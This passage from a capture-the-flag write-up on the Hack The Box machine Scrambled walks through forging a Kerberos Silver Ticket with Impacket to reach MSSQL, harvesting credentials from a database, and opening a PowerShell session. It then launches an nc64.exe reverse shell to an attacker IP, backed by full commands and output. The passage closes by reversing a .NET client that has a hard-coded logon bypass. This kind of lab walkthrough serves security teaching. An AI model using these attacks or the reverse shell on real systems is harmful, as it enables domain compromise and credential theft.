These creds don’t actually directly allow access to anything new for me. But because this account is running the SQL service, I can use the password to perform a [Silver Ticket attack](https://adsecurity.org/?p=2011). The overview linked there from adsecurity.org is really good. A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.

To create a Silver Ticket, an attacker needs:
1. The NTLM hash of the password for the service account;
2. The SID of the domain
3. The service principle name (SPN) associated with the account.

I already acquired the SPN with `GetUserSPNS.py` above, `MSSQLSvc/dc1.scrm.local:1433`.

#### Generate NTLM

To get an NTLM hash of the password “Pegasus60”, I’ll use the commands from [this post](https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html):

```

oxdf@hacky$ iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
(stdin)= b999a16500b87d17ec7f2e2a68778f05

```

[CrackStation](https://crackstation.net/) will verify that:

![image-20220609132540783](https://0xdfimages.gitlab.io/img/image-20220609132540783.png)

#### Domain SID

To get the domain SID, I’ll need to connect back to LDAP, but authenticated. It takes a good deal of troubleshooting and Goolging to get this working (thanks to TheCyberGeek for some tips on this one). If I try to connect as ksimpson, I get an error about SSL/TLS being required:

```

oxdf@hacky$ ldapsearch -h dc1.scrm.local -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)"
ldap_bind: Strong(er) authentication required (8)
        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563

```

I’ll need to download the server certificate to enable this connection:

```

oxdf@hacky$ openssl s_client -connect dc1.scrm.local:636
CONNECTED(00000003)
depth=0 CN = DC1.scrm.local
verify error:num=20:unable to get local issuer certificate
verify return:1         
depth=0 CN = DC1.scrm.local           
verify error:num=21:unable to verify the first certificate
verify return:1                                        
---                                                       
Certificate chain
 0 s:CN = DC1.scrm.local                           
   i:DC = local, DC = scrm, CN = scrm-DC1-CA
---                              
Server certificate
-----BEGIN CERTIFICATE-----
MIIGHDCCBQSgAwIBAgITEgAAAAIJqKDU0Cj0DgAAAAAAAjANBgkqhkiG9w0BAQUF
...[snip]...
G6CIrcE0+XepleMQggP4zOUbTO01AUmq7eX2z031RE4ndrCtgBXuGSHDqnUSvmVN
N6T9KeVeLFfbxp6gyHA3ehMBKrkbp3iLAWiWptbdIHE=
-----END CERTIFICATE-----
...[snip]...

```

I’ll grab that certificate and save it to a file. I could do that in one line with:

```

oxdf@hacky$ echo -n | openssl s_client -connect dc1.scrm.local:636 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > ldapserver.pem
depth=0 CN = DC1.scrm.local
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = DC1.scrm.local
verify error:num=21:unable to verify the first certificate
verify return:1
DONE

```

Now I’ll edit `/etc/ldap/ldap.conf` to point to that:

```

#
# LDAP Defaults
#

# See ldap.conf(5) for details
# This file should be world readable but not world writable.

#BASE   dc=example,dc=com
#URI    ldap://ldap.example.com ldap://ldap-master.example.com:666

#SIZELIMIT      12
#TIMELIMIT      15
#DEREF          never

# TLS certificates (needed for GnuTLS)
TLS_CACERT      /home/oxdf/hackthebox/scrambled-10.10.11.168/ldapserver.pem

```

`ldapsearch` will now dump all the users:

```

oxdf@hacky$ ldapsearch -h dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)" 
# extended LDIF
#
# LDAPv3
# base <DC=scrm,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#
...[snip]...
# Administrator, Users, scrm.local
dn: CN=Administrator,CN=Users,DC=scrm,DC=local
...[snip]...                         
objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
...[snip]...                         

```

I need that SID in string form, so I’ll use [this blog](https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253) and some Python to write a converter:

```

#!/usr/bin/env python3

import base64
import struct
import sys

b64sid = sys.argv[1]
binsid = base64.b64decode(b64sid)
a, N, cccc, dddd, eeee, ffff, gggg = struct.unpack("BBxxxxxxIIIII", binsid)
bb, bbbb = struct.unpack(">xxHIxxxxxxxxxxxxxxxxxxxx", binsid)
bbbbbb = (bb << 32) | bbbb

print(f"S-{a}-{bbbbbb}-{cccc}-{dddd}-{eeee}-{ffff}-{gggg}")

```

It works:

```

oxdf@hacky$ python sid.py  AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
S-1-5-21-2743207045-1827831105-2542523200-500

```

The domain SID is that SID without the `-500`.

#### Domain SID Alternative

An alternative (and simpler) way to get the domain SID is with the `getPac.py` script from Impacket. This script is meant to get the Privilege Attribute Certificate for any user, which just requires auth as an user on the domain. I’ll give it the creds for ksimpson and ask about the administrator:

```

oxdf@hacky$ getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation                                   
                                                            
KERB_VALIDATION_INFO 
LogonTime:                           
    dwLowDateTime:                   861207478 
    dwHighDateTime:                  30986970                                                                           
LogoffTime:                            
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
KickOffTime:                           
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647                                                                         
PasswordLastSet:                             
    dwLowDateTime:                   2585823167             
    dwHighDateTime:                  30921784 
PasswordCanChange:                                          
    dwLowDateTime:                   3297396671 
    dwHighDateTime:                  30921985                                                                           
PasswordMustChange:                                                                                                     
    dwLowDateTime:                   4294967295                                                                         
    dwHighDateTime:                  2147483647 
EffectiveName:                   'administrator'                                                                        
FullName:                        '' 
LogonScript:                     ''    
ProfilePath:                     ''                                                                                     
HomeDirectory:                   '' 
HomeDirectoryDrive:              ''    
LogonCount:                      252                   
BadPasswordCount:                0 
UserId:                          500                                                                                    
PrimaryGroupId:                  513        
...[snip]...
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

 0000   10 00 00 00 5C 1F 64 69  57 68 8F 30 29 09 C5 7B   ....\.diWh.0)..{

```

There’s a ton of information about the account, but for my current purposes, the last item (before this ranom-looking hex at the end) is the domain SID.

#### Generate Ticket

`ticketer.py` (or `impacket-ticketer`) will generate a ticket using the information gathered:

```

oxdf@hacky$ ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache

```

The output file is `administrator.ccache`, which is a kerberos ticket as administrator that only the MSSQL service will trust.

#### Connect

On Linux, Kerberos looks in predefined places for tickets, like `/tmp/krb5cc_[uid of current user]` and any file pointed to by the `KRB5CCACHE` environment variable. If I just run `klist`, it will fail to find the new ticket:

```

oxdf@hacky$ klist 
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

```

If I have the env variable point to the file from `ticketer.py`, it shows information about the ticket:

```

oxdf@hacky$ KRB5CCNAME=administrator.ccache klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@SCRM.LOCAL

Valid starting       Expires              Service principal
06/14/2022 18:44:15  06/14/2032 18:44:15  MSSQLSvc/dc1.scrm.local:1433@SCRM.LOCAL
        renew until 06/14/2032 18:44:15

```

Using that same method, `mssqlclient.py` can connect to the DB using the ticket:

```

oxdf@hacky$ KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>

```

### MSSQL Enumeration

#### Find Password

I’ll start by listing the databases:

```

SQL> select name, database_id from sys.databases;
name                                        database_id   
------------------------------------------   -----------   
master                                                1   
tempdb                                                2   
model                                                 3   
msdb                                                  4   
ScrambleHR                                            5 

```

`ScrambleHR` seems interesting. It has three tables:

```

SQL> SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
TABLE_NAME
------------------------------------------   
Employees
UserImport
Timesheets 

```

The `Employees` and `Timesheets` tables are empty. There’s one row in `UserImport`:

```

SQL> SELECT * from ScrambleHR.dbo.UserImport;
LdapUser               LdapPwd                LdapDomain             RefreshInterval   IncludeGroups   
--------------------   --------------------   --------------------   ---------------   -------------   
MiscSvc                ScrambledEggs9900      scrm.local                          90               0  

```

#### Execute

MSSQL has the ability to run commands via the `xp_cmdshell` stored procedure. It is possible to do so here, but the service account doesn’t have access to much of anything on the box, and it was meant to largely be a dead end.

It does lead to a couple unintended paths, which I’ll show in [Beyond Root](/2022/10/01/htb-scrambled-beyond-root.html).

### PS Session

#### Configure Realm

I’ll need to add this domain to my local `/etc/krb5.conf` file:

```

[libdefaults]
        default_realm = SCRM.LOCAL
# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        SCRM.LOCAL = {
                kdc = dc1.scrm.local
                admin_server = dc1.scrm.local
        }

[domain_realm]

```

#### Update PowerShell

I can’t use `evil-winrm` here, but I can use `pwsh` on Linux, as installed by [these instructions](https://docs.microsoft.com/en-us/powershell/scripting/install/install-ubuntu?view=powershell-7.2). Even then, I’ll have some issues using a `PSSession`:

```

oxdf@hacky$ pwsh                                                    
PowerShell 7.2.4                                
Copyright (c) Microsoft Corporation.                

https://aka.ms/powershell
Type 'help' to get help.

PS /> Enter-PSSession dc1.scrm.local -Credential MiscSvc

PowerShell credential request
Enter your credentials.
Password for user MiscSvc: *****************

Enter-PSSession: MI_RESULT_ACCESS_DENIED

```

I’ll need to enter `pwsh` as root and install the [Open Management Infrastructure - PowerShell Edition](https://github.com/jborean93/omi):

```

oxdf@hacky$ sudo pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /> Install-Module -Name PSWSMan -Scope AllUsers

Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want to install the modules from 'PSGallery'?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
PS /> Install-WSMan
WARNING: WSMan libs have been installed, please restart your PowerShell session to enable it in PowerShell
PS /> exit

```

Now back in PowerShell, I’ll get a session:

```

oxdf@hacky$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /> Enter-PSSession dc1.scrm.local -Credential MiscSvc

PowerShell credential request
Enter your credentials.
Password for user MiscSvc: *****************

[dc1.scrm.local]: PS C:\Users\miscsvc\Documents>

```

And grab `user.txt`:

```

[dc1.scrm.local]: PS C:\Users\miscsvc\Documents> type c:\users\miscsvc\desktop\user.txt
8d9496bc************************

```

### nc

This shell is *super* slow, so I’ll upload `nc64.exe`:

```

[dc1.scrm.local]: PS C:\programdata> iwr 10.10.14.6/nc64.exe -outfile nc64.exe
[dc1.scrm.local]: PS C:\programdata> .\nc64.exe -e powershell 10.10.14.6 443

```

And catch a fresh shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.168:55817
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\programdata>

```

## Shell as System

### Enumeration

As MiscSvc, I have access to the IT share now (the others are still access denied):

```

PS C:\shares> ls

    Directory: C:\shares

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       01/11/2021     15:21                HR
d-----       03/11/2021     19:32                IT
d-----       01/11/2021     15:21                Production
d-----       04/11/2021     22:23                Public
d-----       03/11/2021     19:33                Sales

PS C:\shares> cd IT
cd IT
PS C:\shares\IT> ls

    Directory: C:\shares\IT

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       03/11/2021     21:06                Apps
d-----       03/11/2021     19:32                Logs
d-----       03/11/2021     19:32                Reports 

```

In the `Apps` folder, there are two executables, `ScrambleClient.exe` and `ScrambleLib.dll`:

```

PS C:\shares\IT\Apps\Sales Order Client> ls

    Directory: C:\shares\IT\Apps\Sales Order Client

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       05/11/2021     20:52          86528 ScrambleClient.exe
-a----       05/11/2021     20:52          19456 ScrambleLib.dll    

```

I’ll download both of these over SMB:

```

oxdf@hacky$ smbclient.py -k scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -dc-ip dc1.scrm.local
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# use IT
# get Apps/Sales Order Client/ScrambleClient.exe
# get Apps/Sales Order Client/ScrambleLib.dll

```

### ScrambleClient Reverse

#### Files

Both files are 32-bit .NET executables:

```

oxdf@hacky$ file ScrambleClient.exe 
ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
oxdf@hacky$ file ScrambleLib.dll 
ScrambleLib.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

#### Connect

I’ll jump over to a Windows VM (this part is the same as the [Windows Post](/2022/10/01/htb-scrambled-win.html#scrambleclient-reverse)). Running the EXE pops the same windows from the IT pages:

![image-20220609162004978](https://0xdfimages.gitlab.io/img/image-20220609162004978.png)

With my VPN connected and my `C:\Windows\System32\drivers\etc\hosts` file updated, I’ll click “Edit” and enter the server (the port is already filled):

![image-20220609162249611](https://0xdfimages.gitlab.io/img/image-20220609162249611.png)

I’ll also check the “Enable debug logging” box.

Trying to “Sign In” with any of the creds I have fails:

![image-20220609162352795](https://0xdfimages.gitlab.io/img/image-20220609162352795.png)

If I try that again with WireShark, it shows it’s a text-based protocol:

![image-20220609162450697](https://0xdfimages.gitlab.io/img/image-20220609162450697.png)

#### Credentials

Opening the binaries in [DNSpy](https://github.com/dnSpy/dnSpy), I’ll start with an overview of the files:

![image-20220609162820128](https://0xdfimages.gitlab.io/img/image-20220609162820128.png)

`LoginWindow` seems promising. Several functions down, there’s a `Logon` function:

```

private void Logon(object CredsObject)
{
    bool logonSuccess = false;
    string errorMessage = string.Empty;
    NetworkCredential networkCredential = (NetworkCredential)CredsObject;
    try
    {
        logonSuccess = this._Client.Logon(networkCredential.UserName, networkCredential.Password);
    }
    catch (Exception ex)
    {
        errorMessage = ex.Message;
    }
    finally
    {
        this.LoginComplete(logonSuccess, errorMessage);
    }
}

```

Clicking on the `Logon` that’s called from `this._Client.Logon` jumps over into the `ScrambleNetClient` class in `ScrambleLib`, where `Logon` is defined:

```

public bool Logon(string Username, string Password)
{
    bool result;
    try
    {
        if (string.Compare(Username, "scrmdev", true) == 0)
        {
            Log.Write("Developer logon bypass used");
            result = true;
        }
        else
        {
            ...[snip]...
        }

```

There’s a backdoor account if the username is “scrmdev”!

Going back to the app, changing the username to that works:

![image-20220609163215950](https://0xdfimages.gitlab.io/img/image-20220609163215950.png)

#### LIST\_ORDERS

In WireShark, there’s a new TCP stream (not from the login, as I bypassed that) fetching orders:

![image-20220609163421816](https://0xdfimages.gitlab.io/img/image-20220609163421816.png)

The client send `LIST_ORDERS;` on successful login. The returned base64 string is a serialized .NET object:

```

oxdf@hacky$ echo "AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==" | base64 -d | xxd
base64: invalid input
00000000: 0001 0000 00ff ffff ff01 0000 0000 0000  ................
00000010: 000c 0200 0000 4253 6372 616d 626c 654c  ......BScrambleL
00000020: 6962 2c20 5665 7273 696f 6e3d 312e 302e  ib, Version=1.0.
00000030: 332e 302c 2043 756c 7475 7265 3d6e 6575  3.0, Culture=neu
00000040: 7472 616c 2c20 5075 626c 6963 4b65 7954  tral, PublicKeyT
00000050: 6f6b 656e 3d6e 756c 6c05 0100 0000 1653  oken=null......S
00000060: 6372 616d 626c 654c 6962 2e53 616c 6573  crambleLib.Sales
00000070: 4f72 6465 7207 0000 000b 5f49 7343 6f6d  Order....._IsCom
00000080: 706c 6574 6510 5f52 6566 6572 656e 6365  plete._Reference
00000090: 4e75 6d62 6572 0f5f 5175 6f74 6552 6566  Number._QuoteRef
000000a0: 6572 656e 6365 095f 5361 6c65 7352 6570  erence._SalesRep
000000b0: 0b5f 4f72 6465 7249 7465 6d73 085f 4475  ._OrderItems._Du
000000c0: 6544 6174 650a 5f54 6f74 616c 436f 7374  eDate._TotalCost
000000d0: 0001 0101 0300 0001 7f53 7973 7465 6d2e  .........System.
000000e0: 436f 6c6c 6563 7469 6f6e 732e 4765 6e65  Collections.Gene
000000f0: 7269 632e 4c69 7374 6031 5b5b 5379 7374  ric.List`1[[Syst
00000100: 656d 2e53 7472 696e 672c 206d 7363 6f72  em.String, mscor
00000110: 6c69 622c 2056 6572 7369 6f6e 3d34 2e30  lib, Version=4.0
00000120: 2e30 2e30 2c20 4375 6c74 7572 653d 6e65  .0.0, Culture=ne
00000130: 7574 7261 6c2c 2050 7562 6c69 634b 6579  utral, PublicKey
00000140: 546f 6b65 6e3d 6237 3761 3563 3536 3139  Token=b77a5c5619
00000150: 3334 6530 3839 5d5d 0d06 0200 0000 0006  34e089]]........
00000160: 0300 0000 0a53 4352 4d53 4f33 3630 3106  .....SCRMSO3601.
00000170: 0400 0000 0b53 4352 4d51 5539 3138 3732  .....SCRMQU91872
00000180: 0605 0000 0006 4a20 4861 6c6c 0906 0000  ......J Hall....
00000190: 0000 4011 cae2 69da 0800 0000 0000 2072  ..@...i....... r
000001a0: 4004 0600 0000 7f53 7973 7465 6d2e 436f  @......System.Co
000001b0: 6c6c 6563 7469 6f6e 732e 4765 6e65 7269  llections.Generi
000001c0: 632e 4c69 7374 6031 5b5b 5379 7374 656d  c.List`1[[System
000001d0: 2e53 7472 696e 672c 206d 7363 6f72 6c69  .String, mscorli
000001e0: 622c 2056 6572 7369 6f6e 3d34 2e30 2e30  b, Version=4.0.0
000001f0: 2e30 2c20 4375 6c74 7572 653d 6e65 7574  .0, Culture=neut
00000200: 7261 6c2c 2050 7562 6c69 634b 6579 546f  ral, PublicKeyTo
00000210: 6b65 6e3d 6237 3761 3563 3536 3139 3334  ken=b77a5c561934
00000220: 6530 3839 5d5d 0300 0000 065f 6974 656d  e089]]....._item
00000230: 7305 5f73 697a 6508 5f76 6572 7369 6f6e  s._size._version
00000240: 0600 0008 0809 0700 0000 0000 0000 0000  ................
00000250: 0000 1107 0000 0000 0000 000b            ............

```

#### New Order

On the “New Order” tab, I’ll fill out an order:

![image-20220609163704958](https://0xdfimages.gitlab.io/img/image-20220609163704958.png)

On clicking “Upload”, it pops a box saying it was successful:

![image-20220609163727552](https://0xdfimages.gitlab.io/img/image-20220609163727552.png)

WireShark shows a similar TCP stream, this time with the client sending base64-encoded serialized data to the server:

![image-20220609163813138](https://0xdfimages.gitlab.io/img/image-20220609163813138.png)

#### Debug Log

If I enabled it in the connection settings, or by going to “Tools” > “Enable Debug Logging”, it will write `ScrambleDebugLog.txt` in the same directory as the exe. This is not only another way to see the serialized payloads, but there are some hints in there as well:

```

6/9/2022 1:31:48 PM	Sending data to server: LIST_ORDERS;
6/9/2022 1:31:48 PM	Getting response from server
6/9/2022 1:31:48 PM	Received from server: SUCCESS;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Parsing server response
6/9/2022 1:31:48 PM	Response type = Success
6/9/2022 1:31:48 PM	Splitting and parsing sales orders
6/9/2022 1:31:48 PM	Found 2 sales orders in server response
6/9/2022 1:31:48 PM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Binary formatter init successful
6/9/2022 1:31:48 PM	Deserialization successful
